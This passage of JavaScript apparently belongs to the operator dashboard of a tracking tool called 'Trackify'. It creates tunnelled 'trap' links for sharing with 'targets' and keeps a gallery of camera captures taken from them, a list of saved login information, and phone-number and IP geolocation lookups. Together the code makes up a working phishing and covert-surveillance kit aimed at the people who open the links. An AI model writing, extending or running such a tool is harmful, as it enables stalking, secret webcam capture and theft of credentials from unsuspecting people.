                    lastExcerpt = data.tunnel_log_excerpt;
                }
                if (data.status === 'forbidden' || data.status === 'error') {
                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (data.message || 'Could not get Sniffer link'), 'dim');
                    if (siBtn) {
                        siBtn.disabled = false;
                        siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    }
                    return;
                }
                if (data.link) {
                    if (data.payload_ok === false) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] Tunnel is up but saveinfo-trap-*.html was not written — fix permissions', 'dim');
                    } else if (data.template_slug) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template_slug + '" → /' + (data.trap_file || 'saveinfo-trap-?.html'), 'dim');
                    }
                    const siLinkBox = document.getElementById('siLinkBox');
                    const siInput = document.getElementById('siTrackerLink');
                    const siStop = document.getElementById('siStopBtn');
                    if (siLinkBox) {
                        siLinkBox.style.display = 'flex';
                    }
                    if (siInput) {
                        siInput.value = data.link;
                    }
                    if (siStop) {
                        siStop.style.display = 'inline-flex';
                    }
                    addTerminalLineTo(saveInfoTerminalEl, '', 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer URL: ' + data.link, 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this link (ends in saveinfo_entry.php).', 'yellow');
                    if (siBtn) {
                        siBtn.disabled = false;
                        siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    }
                    checkStatus();
                    return;
                }
            }
            addTerminalLineTo(saveInfoTerminalEl, '[!] Timeout: no tunnel URL (90s).', 'dim');
            if (lastExcerpt) {
                addTerminalLineTo(saveInfoTerminalEl, '[!] cloudflared log: ' + lastExcerpt, 'dim');
            }
            if (siBtn) {
                siBtn.disabled = false;
                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
            }
        }

        async function stopService() {
            const stopBtn = document.getElementById('stopBtn');
            const stopBtnSidebar = document.getElementById('stopBtnSidebar');
            stopBtn.disabled = true;
            stopBtnSidebar.disabled = true;
            try {
                const res = await fetch(API + '?action=stop', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success') {
                    addTerminalLine('', 'dim');
                    addTerminalLine('[+] Tunnel stopped.', 'dim');
                    addTerminalLineTo(saveInfoTerminalEl, '', 'dim');
                    addTerminalLineTo(saveInfoTerminalEl, '[+] Tunnel stopped (Sniffer URL no longer valid).', 'dim');
                    trackerLinkInput.value = '';
                    syncTrackifyTunnelRow(null, false);
                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
                    statusLink.textContent = '';
                    stopBtnSidebar.style.display = 'none';
                    const siBox = document.getElementById('siLinkBox');
                    const siIn = document.getElementById('siTrackerLink');
                    const siSt = document.getElementById('siStopBtn');
                    if (siBox) {
                        siBox.style.display = 'none';
                    }
                    if (siIn) {
                        siIn.value = '';
                    }
                    if (siSt) {
                        siSt.style.display = 'none';
                    }
                    const toast = document.getElementById('toast');
                    toast.textContent = 'Tunnel stopped';
                    toast.style.background = 'var(--accent-yellow)';
                    toast.classList.add('show');
                    setTimeout(() => { toast.classList.remove('show'); toast.style.background = ''; }, 2000);
                } else {
                    const msg = (data && data.message) ? data.message : 'Stop failed';
                    addTerminalLine('[!] ' + msg, 'dim');
                }
            } catch (e) {
                addTerminalLine('[!] Error stopping: ' + e.message, 'dim');
            }
            stopBtn.disabled = false;
            stopBtnSidebar.disabled = false;
        }

        function copyViaInputField(input) {
            const wasReadOnly = input.readOnly;
            try {
                input.readOnly = false;
                input.focus();
                input.select();
                input.setSelectionRange(0, input.value.length);
                const ok = document.execCommand('copy');
                input.readOnly = wasReadOnly;
                return ok;
            } catch (e) {
                try {
                    input.readOnly = wasReadOnly;
                } catch (e2) {}
                return false;
            }
        }

        function copyViaHiddenTextarea(text) {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.setAttribute('readonly', '');
            ta.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            ta.setSelectionRange(0, text.length);
            let ok = false;
            try {
                ok = document.execCommand('copy');
            } catch (e) {}
            document.body.removeChild(ta);
            return ok;
        }

        function showCopyResult(ok) {
            const toast = document.getElementById('toast');
            toast.textContent = ok
                ? 'Copied to clipboard!'
                : 'Could not copy automatically. Select the link in the box and press Ctrl+C (Cmd+C on Mac).';
            toast.style.background = ok ? '' : 'var(--accent-red)';
            toast.classList.add('show');
            setTimeout(function () {
                toast.classList.remove('show');
                toast.style.background = '';
            }, ok ? 2000 : 4000);
        }

        function copyLink() {
            const input = trackerLinkInput;
            const link = input && input.value;
            if (!link) return;

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(link).then(function () {
                    showCopyResult(true);
                }).catch(function () {
                    showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
                });
                return;
            }
            showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
        }

        function copySaveInfoLink() {
            const input = document.getElementById('siTrackerLink');
            const link = input && input.value;
            if (!link) {
                return;
            }

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(link).then(function () {
                    showCopyResult(true);
                }).catch(function () {
                    showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
                });
                return;
            }
            showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
        }

        function switchView(which) {
            const trackifyLayout = document.getElementById('trackifyLayout');
            const phoneLayout = document.getElementById('phoneLayout');
            const ipLayout = document.getElementById('ipLayout');
            const saveInfoLayout = document.getElementById('saveInfoLayout');
            const navTrackify = document.getElementById('navItemTrackify');
            const navPhone = document.getElementById('navItemPhone');
            const navIp = document.getElementById('navItemIp');
            const navSaveInfo = document.getElementById('navItemSaveInfo');

            if (!trackifyLayout || !phoneLayout || !ipLayout || !navTrackify || !navPhone || !navIp) return;

            closeSideNav();

            navTrackify.classList.remove('active');
            navPhone.classList.remove('active');
            navIp.classList.remove('active');
            if (navSaveInfo) {
                navSaveInfo.classList.remove('active');
            }

            if (which === 'phone') {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'block';
                ipLayout.style.display = 'none';
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                navPhone.classList.add('active');
                loadPhoneHistory();
            } else if (which === 'ip') {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'block';
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                navIp.classList.add('active');
                setTimeout(function () {
                    if (typeof ipLookupLeafletMap !== 'undefined' && ipLookupLeafletMap) {
                        try { ipLookupLeafletMap.invalidateSize(); } catch (e) {}
                    }
                }, 250);
            } else if (which === 'saveinfo' && saveInfoLayout && navSaveInfo) {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'none';
                saveInfoLayout.style.display = 'block';
                navSaveInfo.classList.add('active');
                loadSaveInfoTemplates();
                loadSavedInfo();
            } else {
                trackifyLayout.style.display = 'grid';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'none';
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                navTrackify.classList.add('active');
            }
        }

        function isMobileNavMode() {
            return window.matchMedia && window.matchMedia('(max-width: 820px)').matches;
        }

        function setSideNavOpen(open) {
            const sideNav = document.querySelector('.side-nav');
            const overlay = document.getElementById('sideNavOverlay');
            const toggle = document.getElementById('sideNavToggle');
            if (!sideNav || !overlay || !toggle) return;

            if (open) {
                sideNav.classList.add('is-open');
                overlay.classList.add('is-open');
                toggle.setAttribute('aria-expanded', 'true');
                toggle.setAttribute('aria-label', 'Close menu');
            } else {
                sideNav.classList.remove('is-open');
                overlay.classList.remove('is-open');
                toggle.setAttribute('aria-expanded', 'false');
                toggle.setAttribute('aria-label', 'Open menu');
            }
        }

        function openSideNav() {
            if (!isMobileNavMode()) return;
            setSideNavOpen(true);
        }

        function closeSideNav() {
            setSideNavOpen(false);
        }

        function toggleSideNav() {
            if (!isMobileNavMode()) return;
            const sideNav = document.querySelector('.side-nav');
            const isOpen = !!(sideNav && sideNav.classList.contains('is-open'));
            setSideNavOpen(!isOpen);
        }

        document.addEventListener('DOMContentLoaded', function () {
            try {
                const params = new URLSearchParams(window.location.search);
                const view = (params.get('view') || '').toLowerCase();
                if (view === 'saveinfo' || view === 'phone' || view === 'ip') {
                    switchView(view);
                }
            } catch (e) {}
            const overlay = document.getElementById('sideNavOverlay');
            const toggle = document.getElementById('sideNavToggle');
            if (toggle) {
                toggle.addEventListener('click', function () {
                    toggleSideNav();
                });
            }
            if (overlay) {
                overlay.addEventListener('click', function () {
                    closeSideNav();
                });
            }
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') {
                    closeSideNav();
                }
            });
            window.addEventListener('resize', function () {
                if (!isMobileNavMode()) {
                    closeSideNav();
                }
            });
        });

        let ipLookupLeafletMap = null;
        let ipLookupLeafletMarker = null;
        let leafletLoadPromise = null;

        function destroyIpLookupMap() {
            if (ipLookupLeafletMap) {
                try { ipLookupLeafletMap.remove(); } catch (e) {}
                ipLookupLeafletMap = null;
                ipLookupLeafletMarker = null;
            }
        }

        function setIpMapPlaceholder(text) {
            destroyIpLookupMap();
            const el = document.getElementById('ipLookupMap');
            if (!el) return;
            el.className = 'ip-lookup-map ip-lookup-map--empty';
            el.textContent = text;
        }

        function ensureLeafletLoaded() {
            if (window.L) {
                return Promise.resolve();
            }
            if (leafletLoadPromise) {
                return leafletLoadPromise;
            }
            leafletLoadPromise = new Promise(function (resolve, reject) {
                const link = document.createElement('link');
                link.rel = 'stylesheet';
                link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
                document.head.appendChild(link);
                const s = document.createElement('script');
                s.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
                s.onload = function () { resolve(); };
                s.onerror = function () { reject(new Error('Could not load map library')); };
                document.body.appendChild(s);
            });
            return leafletLoadPromise;
        }

        function escapeHtmlText(s) {
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
        }

        function renderIpDetails(data) {
            const wrap = document.getElementById('ipLookupDetails');
            if (!wrap) return;
            if (!data || data.status !== 'success') {
                wrap.innerHTML = '<p style="margin:0;color:var(--text-muted);font-size:13px">No details returned.</p>';
                return;
            }
            const rows = Array.isArray(data.details_rows) ? data.details_rows : [];
            if (rows.length === 0 && data.details && typeof data.details === 'object') {
                const keys = Object.keys(data.details);
                let html = '<div class="ip-lookup-grid">';
                keys.forEach(function (k) {
                    html += '<div class="ip-lookup-pair-row"><div class="ip-lookup-half" style="grid-column:1/-1;border-right:none">' +
                        '<span class="ip-lookup-lbl">' + escapeHtmlText(k) + '</span>' +
                        '<span class="ip-lookup-val">' + escapeHtmlText(String(data.details[k])) + '</span></div></div>';
                });
                html += '</div>';
                wrap.innerHTML = html;
                return;
            }
            let html = '<div class="ip-lookup-grid">';
            rows.forEach(function (row) {
                const L = row.left || {};
                const R = row.right || {};
                html += '<div class="ip-lookup-pair-row">' +
                    '<div class="ip-lookup-half">' +
                    '<span class="ip-lookup-lbl">' + escapeHtmlText(L.label || '') + '</span>' +
                    '<span class="ip-lookup-val">' + escapeHtmlText(String(L.value != null ? L.value : '—')) + '</span>' +
                    '</div>' +
                    '<div class="ip-lookup-half">' +
                    '<span class="ip-lookup-lbl">' + escapeHtmlText(R.label || '') + '</span>' +
                    '<span class="ip-lookup-val">' + escapeHtmlText(String(R.value != null ? R.value : '—')) + '</span>' +
                    '</div>' +
                    '</div>';
            });
            html += '</div>';
            const extra = Array.isArray(data.details_extra) ? data.details_extra : [];
            if (extra.length > 0) {
                html += '<div class="ip-lookup-extra"><h3>Additional fields</h3>';
                extra.forEach(function (row) {
                    html += '<div class="ip-lookup-extra-row">' +
                        '<span class="ip-lookup-lbl">' + escapeHtmlText(row.label || '') + '</span>' +
                        '<span class="ip-lookup-val">' + escapeHtmlText(String(row.value != null ? row.value : '')) + '</span>' +
                        '</div>';
                });
                html += '</div>';
            }
            wrap.innerHTML = html;
        }

        function showIpOnMap(lat, lon, label) {
            const el = document.getElementById('ipLookupMap');
            if (!el) return;
            ensureLeafletLoaded().then(function () {
                destroyIpLookupMap();
                el.className = 'ip-lookup-map';
                el.innerHTML = '';
                ipLookupLeafletMap = L.map(el).setView([lat, lon], 10);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright" rel="noopener">OpenStreetMap</a>'
                }).addTo(ipLookupLeafletMap);
                ipLookupLeafletMarker = L.marker([lat, lon]).addTo(ipLookupLeafletMap);
                if (label) {
                    ipLookupLeafletMarker.bindPopup(escapeHtmlText(label)).openPopup();
                }
                setTimeout(function () {
                    if (ipLookupLeafletMap) ipLookupLeafletMap.invalidateSize();
                }, 150);
            }).catch(function () {
                setIpMapPlaceholder('Map could not load. Check your network or try again.');
            });
        }

        function performIpLookup() {
            const input = document.getElementById('ipLookupInput');
            const termEl = document.getElementById('ipLookupTerminal');
            const errEl = document.getElementById('ipLookupError');
            if (!input || !termEl) return;

            const raw = (input.value || '').trim();
            if (!raw) {
                if (errEl) {
                    errEl.textContent = 'Please enter an IP address.';
                    errEl.hidden = false;
                }
                return;
            }
            if (errEl) {
                errEl.textContent = '';
                errEl.hidden = true;
            }

            const safeIp = escapeHtmlText(raw);
            termEl.innerHTML =
                '<div class="phone-lookup-terminal">' +
                '<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Looking up <span class="link">' + safeIp + '</span> via FindIP ...</div>' +
                '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                '</div>';

            fetch(API + '?action=ip_lookup&ip=' + encodeURIComponent(raw), { credentials: 'same-origin' })
                .then(function (r) { return r.json(); })
                .then(function (data) {
                    const lines = [];
                    if (!data || data.status !== 'success') {
                        const msg = (data && data.message) ? String(data.message) : 'Lookup failed';
                        lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> ' + escapeHtmlText(msg) + '</div>');
                        lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                        termEl.innerHTML = '<div class="phone-lookup-terminal">' + lines.join('') + '</div>';
                        renderIpDetails({ status: 'error' });
                        setIpMapPlaceholder('Lookup failed — no map.');
                        return;
                    }

                    lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[+]</span> FindIP response received for <span class="link">' + safeIp + '</span></div>');
                    lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                    termEl.innerHTML = '<div class="phone-lookup-terminal">' + lines.join('') + '</div>';

                    renderIpDetails(data);

                    const lat = typeof data.lat === 'number' ? data.lat : null;
                    const lon = typeof data.lon === 'number' ? data.lon : null;
                    if (lat !== null && lon !== null && !isNaN(lat) && !isNaN(lon)) {
                        const locLabel = (data.details && data.details.City && data.details.Country)
                            ? (data.details.City + ', ' + data.details.Country)
                            : raw;
                        showIpOnMap(lat, lon, locLabel);
                    } else {
                        setIpMapPlaceholder('No latitude/longitude in this response. Details may still list location text.');
                    }
                })
                .catch(function (err) {
                    const msg = (err && err.message) ? err.message : String(err);
                    termEl.innerHTML =
                        '<div class="phone-lookup-terminal">' +
                        '<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> Error: ' + escapeHtmlText(msg) + '</div>' +
                        '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                        '</div>';
                    setIpMapPlaceholder('Request error.');
                });
        }

        (function initIpLookupValidation() {
            const input = document.getElementById('ipLookupInput');
            const errorEl = document.getElementById('ipLookupError');
            if (!input || !errorEl) return;
            input.addEventListener('input', function () {
                if (input.value && input.value.trim()) {
                    errorEl.textContent = '';
                    errorEl.hidden = true;
                }
            });
        })();

        (function initPhoneLookupValidation() {
            const input = document.getElementById('phoneLookupInput');
            const errorEl = document.getElementById('phoneLookupError');
            if (!input || !errorEl) return;
            input.addEventListener('input', function () {
                if (input.value && input.value.trim()) {
                    errorEl.textContent = '';
                    errorEl.hidden = true;
                }
            });
        })();

        async function loadPhoneHistory() {
            const listEl = document.getElementById('phoneHistoryList');
            if (!listEl) return;
            try {
                const res = await fetch(API + '?action=phone_history', { credentials: 'same-origin' });
                const data = await res.json();
                if (!data || data.status !== 'success' || !Array.isArray(data.history) || data.history.length === 0) {
                    listEl.innerHTML =
                        '<div class="phone-history-item">' +
                        '<div class="phone-history-meta">No scans yet.</div>' +
                        '</div>';
                    return;
                }
                listEl.innerHTML = data.history.map(item => {
                    const num = String(item.phone_number || '');
                    const cnt = typeof item.url_count === 'number' ? item.url_count : (Array.isArray(item.urls) ? item.urls.length : 0);
                    const ts = String(item.created_at || '');

                    let first = Array.isArray(item.urls) && item.urls.length ? item.urls[0] : '';
                    let rawUrl = '';
                    let title = '';
                    if (first && typeof first === 'object') {
                        rawUrl = String(first.url || first.link || '');
                        if (first.title) title = String(first.title);
                    } else {
                        rawUrl = String(first || '');
                    }

                    const safeNum = num.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeTs = ts.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeUrl = rawUrl.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeTitle = title ? title.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '';

                    return '' +
                        '<div class="phone-history-item">' +
                        '<div class="phone-history-number">' + safeNum + '</div>' +
                        '<div class="phone-history-meta">' + cnt + ' URL(s) · ' + safeTs + '</div>' +
                        (safeUrl ? '<div class="phone-history-urls"><a href="' + safeUrl + '" target="_blank" rel="noopener noreferrer">' +
                            (safeTitle || safeUrl) + '</a></div>' : '') +
                        '</div>';
                }).join('');
            } catch (e) {
                listEl.innerHTML =
                    '<div class="phone-history-item">' +
                    '<div class="phone-history-meta">Could not load history.</div>' +
                    '</div>';
            }
        }

        function performPhoneLookup() {
            const input = document.getElementById('phoneLookupInput');
            const resultsEl = document.getElementById('phoneLookupResults');
            const errorEl = document.getElementById('phoneLookupError');
            if (!input || !resultsEl) return;

            const raw = (input.value || '').trim();
            if (!raw) {
                if (errorEl) {
                    errorEl.textContent = 'Please enter a phone number.';
                    errorEl.hidden = false;
                }
                return;
            }
            if (errorEl) {
                errorEl.textContent = '';
                errorEl.hidden = true;
            }

            // Normalize a bit but keep the exact string for quoted searches
            const phoneForQuery = raw.replace(/\s+/g, ' ').trim();
            const safeDisplay = phoneForQuery.replace(/</g, '&lt;').replace(/>/g, '&gt;');

            resultsEl.innerHTML =
                '<div class="phone-lookup-terminal">' +
                '<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Searching for <span class="link">' + safeDisplay + '</span> ...</div>' +
                '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                '</div>';

            fetch(API + '?action=phone_lookup&number=' + encodeURIComponent(phoneForQuery), {
                credentials: 'same-origin'
            }).then(r => r.json()).then(data => {
                const lines = [];
                if (!data || data.status !== 'success') {
                    const msg = (data && data.message) ? String(data.message) : 'Search failed';
                    lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> ' + msg.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>');
                    lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                    resultsEl.innerHTML =
                        '<div class="phone-lookup-terminal">' +
                        lines.join('') +
                        '</div>';
                    return;
                }

                const urls = Array.isArray(data.urls) ? data.urls : [];
                lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Found ' + urls.length + ' result(s) for <span class="link">' + safeDisplay + '</span></div>');
                lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Copy any URL below and open it in your browser.</div>');
                lines.push('<div class="phone-lookup-terminal-line">&nbsp;</div>');

                if (urls.length > 0) {
                    urls.forEach(entry => {
                        let rawUrl = '';
                        let title = '';
                        let snippet = '';
                        if (entry && typeof entry === 'object') {
                            rawUrl = String(entry.url || entry.link || '');
                            if (entry.title) title = String(entry.title);
                            if (entry.snippet) snippet = String(entry.snippet);
                        } else {
                            rawUrl = String(entry);
                        }
                        if (!rawUrl) return;
                        const safeUrl = rawUrl.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                        const safeTitle = title ? title.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '';
                        const safeSnippet = snippet ? snippet.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '';
                        lines.push(
                            '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~#</span> ' +
                            '<a class="link" href="' + safeUrl + '" target="_blank" rel="noopener noreferrer">' +
                            safeUrl +
                            '</a></div>'
                        );
                        if (safeTitle || safeSnippet) {
                            const meta = [safeTitle, safeSnippet].filter(Boolean).join(' — ');
                            lines.push(
                                '<div class="phone-lookup-terminal-line"><span class="hint">    ↳ ' + meta + '</span></div>'
                            );
                        }
                    });
                }
                lines.push('<div class="phone-lookup-terminal-line">&nbsp;</div>');
                lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');

                resultsEl.innerHTML =
                    '<div class="phone-lookup-terminal">' +
                    lines.join('') +
                    '</div>';
            }).catch(err => {
                const msg = (err && err.message) ? err.message : String(err);
                resultsEl.innerHTML =
                    '<div class="phone-lookup-terminal">' +
                    '<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> Error: ' + msg.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>' +
                    '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                    '</div>';
            });
        }

        function syncGallerySelectAll() {
            const grid = document.getElementById('galleryGrid');
            const selectAll = document.getElementById('gallerySelectAll');
            if (!grid || !selectAll) return;
            const cbs = grid.querySelectorAll('.gallery-select-cb');
            if (cbs.length === 0) {
                selectAll.checked = false;
                selectAll.indeterminate = false;
                return;
            }
            const n = [...cbs].filter(c => c.checked).length;
            selectAll.checked = n === cbs.length;
            selectAll.indeterminate = n > 0 && n < cbs.length;
        }

        function updateGalleryBulkDeleteBtn() {
            const grid = document.getElementById('galleryGrid');
            const btn = document.getElementById('galleryBulkDelete');
            if (!grid || !btn) return;
            const n = grid.querySelectorAll('.gallery-select-cb:checked').length;
            btn.disabled = n === 0;
        }

        function resetGallerySelectionUi() {
            const selectAll = document.getElementById('gallerySelectAll');
            if (selectAll) {
                selectAll.checked = false;
                selectAll.indeterminate = false;
            }
            updateGalleryBulkDeleteBtn();
        }

        async function deletePhotosByPaths(paths) {
            if (!paths || !paths.length) return;
            try {
                const res = await fetch(API + '?action=delete_photos', {
                    method: 'POST',
                    credentials: 'same-origin',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ paths })
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Delete failed');
                    return;
                }
                const toast = document.getElementById('toast');
                let msg = data.deleted ? 'Deleted ' + data.deleted + ' file(s)' : 'Nothing deleted';
                if (data.failed) msg += ' (' + data.failed + ' failed)';
                toast.textContent = msg;
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2500);
                await loadPhotos(currentPage);
            } catch (err) {
                alert('Delete failed: ' + (err && err.message ? err.message : String(err)));
            }
        }

        async function loadPhotos(page = 1) {
            try {
                const res = await fetch(API + '?action=photos&page=' + page + '&per_page=12', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success') {
                    currentPage = page;
                    const { photos, pagination } = data;
                    const grid = document.getElementById('galleryGrid');
                    const paginationEl = document.getElementById('pagination');
                    const photoCount = document.getElementById('photoCount');
                    const prevBtn = document.getElementById('prevBtn');
                    const nextBtn = document.getElementById('nextBtn');
                    const paginationInfo = document.getElementById('paginationInfo');
                    const toolbar = document.getElementById('galleryToolbar');

                    if (photos.length === 0 && pagination.total > 0 && pagination.has_prev) {
                        await loadPhotos(page - 1);
                        return;
                    }

                    photoCount.textContent = pagination.total ? pagination.total + ' capture' + (pagination.total !== 1 ? 's' : '') : '';

                    const quotaBanner = document.getElementById('captureQuotaBanner');
                    const q = data.capture_quota;
                    if (quotaBanner && q) {
                        if (q.full) {
                            quotaBanner.style.display = 'block';
                            quotaBanner.textContent = 'Maximum image captures reached (' + q.used + '/' + q.max + '). Delete photos below to allow new camera uploads.';
                        } else {
                            quotaBanner.style.display = 'none';
                        }
                    }

                    if (toolbar) {
                        toolbar.style.display = pagination.total > 0 ? 'flex' : 'none';
                    }
                    resetGallerySelectionUi();

                    if (photos.length === 0) {
                        grid.innerHTML = `
                            <div class="gallery-empty" id="galleryEmpty">
                                <div class="gallery-empty-icon">📷</div>
                                <div class="gallery-empty-title">No captures yet</div>
                                <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
                                <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
                            </div>
                        `;
                        paginationEl.style.display = 'none';
                    } else {
                        grid.innerHTML = photos.map(p => `
                            <div class="gallery-item" tabindex="0" title="Click to view full size"
                                 data-full-src="${escapeHtmlAttr(p.path)}"
                                 aria-label="Capture ${escapeHtmlAttr(p.filename || '')}">
                                <div class="gallery-item-actions">
                                    <label class="gallery-toolbar-label gallery-select-label">
                                        <input type="checkbox" class="gallery-select-cb" data-path="${escapeHtmlAttr(p.path)}">
                                    </label>
                                    <button type="button" class="gallery-delete-one" data-path="${escapeHtmlAttr(p.path)}" title="Delete" aria-label="Delete capture">×</button>
                                </div>
                                <img src="${p.path}" alt="" loading="lazy">
                                <div class="gallery-item-overlay">${new Date(p.date * 1000).toLocaleString()} · View</div>
                            </div>
                        `).join('');
                        paginationEl.style.display = 'flex';
                        prevBtn.disabled = !pagination.has_prev;
                        nextBtn.disabled = !pagination.has_next;
                        paginationInfo.textContent = `Page ${pagination.page} of ${pagination.total_pages}`;
                        syncGallerySelectAll();
                        updateGalleryBulkDeleteBtn();
                    }
                }
            } catch (e) {}
        }

        function openLightbox(src) {
            if (!src) return;
            const resolved = new URL(src, window.location.href).href;
            const img = document.getElementById('lightboxImg');
            img.src = resolved;
            document.getElementById('lightbox').classList.add('show');
            document.body.style.overflow = 'hidden';
        }

        function closeLightbox() {
            document.getElementById('lightbox').classList.remove('show');
            document.getElementById('lightboxImg').src = '';
            document.body.style.overflow = '';
        }

        (function initGalleryLightbox() {
            const grid = document.getElementById('galleryGrid');
            if (!grid) return;
            grid.addEventListener('click', function (e) {
                if (e.target.closest('.gallery-item-actions')) return;
                const item = e.target.closest('.gallery-item');
                if (!item || !grid.contains(item)) return;
                const src = item.getAttribute('data-full-src');
                if (src) openLightbox(src);
            });
            grid.addEventListener('keydown', function (e) {
                if (e.key !== 'Enter' && e.key !== ' ') return;
                if (e.target.closest('.gallery-item-actions')) return;
                const item = e.target.closest('.gallery-item');
                if (!item || !grid.contains(item)) return;
                e.preventDefault();
                const src = item.getAttribute('data-full-src');
                if (src) openLightbox(src);
            });
            grid.addEventListener('change', function (e) {
                if (!e.target.classList || !e.target.classList.contains('gallery-select-cb')) return;
                syncGallerySelectAll();
                updateGalleryBulkDeleteBtn();
            });
        })();

        (function initGalleryBulkControls() {
            const selectAll = document.getElementById('gallerySelectAll');
            const bulkDel = document.getElementById('galleryBulkDelete');
            const grid = document.getElementById('galleryGrid');
            if (!selectAll || !bulkDel || !grid) return;
            selectAll.addEventListener('change', function () {
                grid.querySelectorAll('.gallery-select-cb').forEach(function (cb) {
                    cb.checked = selectAll.checked;
                });
                selectAll.indeterminate = false;
                updateGalleryBulkDeleteBtn();
            });
            bulkDel.addEventListener('click', function () {
                const paths = [...grid.querySelectorAll('.gallery-select-cb:checked')]
                    .map(function (cb) { return cb.getAttribute('data-path'); })
                    .filter(Boolean);
                if (!paths.length) return;
                if (!confirm('Delete ' + paths.length + ' capture(s)?')) return;
                deletePhotosByPaths(paths);
            });
            grid.addEventListener('click', function (e) {
                const btn = e.target.closest('.gallery-delete-one');
                if (!btn || !grid.contains(btn)) return;
                e.stopPropagation();
                e.preventDefault();
                const path = btn.getAttribute('data-path');
                if (!path) return;
                if (!confirm('Delete this capture?')) return;
                deletePhotosByPaths([path]);
            });
        })();

        document.addEventListener('keydown', function (e) {
            if (e.key !== 'Escape') {
                return;
            }
            if (document.getElementById('lightbox').classList.contains('show')) {
                closeLightbox();
                return;
            }
            const dm = document.getElementById('disclaimerModal');
            if (dm && dm.classList.contains('show')) {
                dm.classList.remove('show');
            }
        });

        function openDisclaimer() {
            document.getElementById('disclaimerModal').classList.add('show');
        }

        function closeDisclaimer(event) {
            if (!event || event.target === event.currentTarget || event.target.classList.contains('modal-close')) {
                document.getElementById('disclaimerModal').classList.remove('show');
            }
        }

        async function clearCaptures() {
            const btn = document.getElementById('clearCapturesBtn');
            if (!btn) return;
            if (!confirm('Clear recent capture history?')) return;

            btn.disabled = true;
            try {
                const res = await fetch(API + '?action=clear_captures', {
                    method: 'POST',
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Could not clear captures');
                    return;
                }
                capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
                const toast = document.getElementById('toast');
                toast.textContent = 'Capture history cleared';
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2000);
            } catch (e) {
                alert('Could not clear captures: ' + (e && e.message ? e.message : String(e)));
            } finally {
                btn.disabled = false;
            }
        }

        function formatSavedLoginAt(iso) {
            if (!iso) {
